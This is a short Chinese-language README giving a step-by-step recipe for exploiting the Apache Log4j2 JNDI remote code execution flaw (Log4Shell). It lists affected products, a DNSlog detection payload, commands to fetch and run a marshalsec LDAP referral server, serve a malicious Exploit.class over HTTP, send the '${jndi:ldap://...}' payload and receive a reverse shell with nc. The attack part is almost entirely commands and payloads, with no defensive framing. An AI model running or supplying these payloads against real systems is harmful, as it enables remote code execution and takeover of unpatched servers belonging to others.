# readme

## 1、说明

Apache Log4j2存在远程执行漏洞，目前已经包括但不仅限于 Spring-Boot-strater-log4j2、Apache Struts2、Apache Solr、Apache Druid、Apache Flink、ElasticSearch、Flume、Dubbo、Jedis、Logstash、Kafka 等。





## 2、探测

```
${jndi:ldap://xx.dnslog.cn/exp}
```



## 3、利用

```
https://github.com/RandomRobbieBF/marshalsec-jar/raw/master/marshalsec-0.0.3-SNAPSHOT-all.jar   github 下载
一个公网vps
```

java jdk1.6 编译的java.class文件(编译版本比目标版本高 就gg利用不成功) ( 目标jdk版本过高也gg)


```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Exploit 8989
```

(在Exploit.class下开启web服务--修改ip回连nc)

python3 -m http.server 8000



发送payload

```
${jndi:ldap://127.0.0.1:8989/#Exploit}
```





注意：

```
8000为vpn的web服务端口
8989为jar文件开启的可供目标请求java文件的端口
java文件内置端口为nc回连端口
```

